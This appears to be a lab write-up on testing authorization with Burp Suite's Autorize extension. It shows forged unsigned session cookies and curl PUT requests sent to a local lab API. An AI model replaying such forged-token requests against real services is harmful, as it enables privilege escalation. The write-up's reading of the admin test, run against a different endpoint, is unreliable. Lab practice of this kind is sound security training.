
# Lab 0x06: Testing with Autorize 👾

## 📄 Understanding Burp Suite, Autorize, and Curl Commands

### 🛡️ Introduction
This lab focuses on using the **Autorize** extension in Burp Suite and executing curl commands to identify and exploit authorization vulnerabilities in a web application.

---

## 🏗️ Setup

### Tool: Burp Suite with Autorize Extension
**Purpose:**  
- Test web application security by manipulating session cookies to identify authorization vulnerabilities.

### Utilizing Autorize Tab
1. Add the session cookie:
   ```
   Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVzc2FteSIsInJvbGUiOiJhZG1pbiJ9.
   ```
2. Once set, all requests routed through Burp Suite will use this session cookie.
3. Decode the cookie to verify it belongs to the user `jessamy`.

---

## 🔍 Detailed Commands

### Command to Test as Staff User
**Terminal Input:**
```bash
curl -X PUT --proxy localhost:8080 -H "Content-Type: application/json" -b "session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=." -d '{"username":"jeremy", "bio": "New bio v2."}' http://localhost/labs/api/v2/account.php
```

**Output:**  
```json
{"status":"success","message":"Bio updated successfully"}
```

**Explanation:**  
The request with Jeremy's staff credentials was successful, which may indicate an authorization issue if staff aren’t permitted to edit bios.

---

### Command to Test as Admin User
**Terminal Input:**
```bash
curl -X PUT --proxy localhost:8080 -H "Content-Type: application/json" -b "session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVzc2FteSIsInJvbGUiOiJhZG1pbiJ9." -d '{"username":"jeremy", "bio": "New bio v2."}' http://localhost/labs/api/v2/account2.php
```

**Output:**  
```json
{"status":"error","message":"Unauthorized"}
```

**Explanation:**  
This attempt using admin credentials resulted in an error, showing that role-based access controls for this action are enforced correctly.

---

## 📋 Summary

### What We Learned
- Setting specific session cookies in Autorize helps simulate and test different user roles and permissions.
- The extension helps confirm if web applications properly restrict or allow actions based on user roles.

### Why It Matters
- Testing with different user roles ensures that only authorized users can perform sensitive actions, preventing privilege escalation or unauthorized access.

---

## 🔄 Next Steps
1. Further Testing:
   - Test more scenarios with different user roles and endpoints.
2. Document Findings:
   - Record tests and outcomes for remediation of vulnerabilities.
